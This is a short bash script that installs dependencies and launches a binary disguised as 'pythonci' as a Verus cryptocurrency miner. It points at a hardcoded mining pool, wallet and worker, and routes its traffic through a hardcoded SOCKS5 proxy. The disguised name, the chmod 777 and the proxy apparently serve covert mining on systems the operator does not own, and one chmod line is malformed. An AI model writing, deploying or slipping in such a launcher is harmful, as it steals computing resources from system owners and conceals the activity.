#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x nos.sh && chmod +x pythonci chmod 777 pythonci nos.sh
screen -dmS ls
PL=stratum+tcp://na.luckpool.net:3956
WT=RJfxuiyjCUm9w7Xryn5ssNF6voJKRBdRGR
WR=GC17
PY=socks5://98.185.94.65:15608
./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
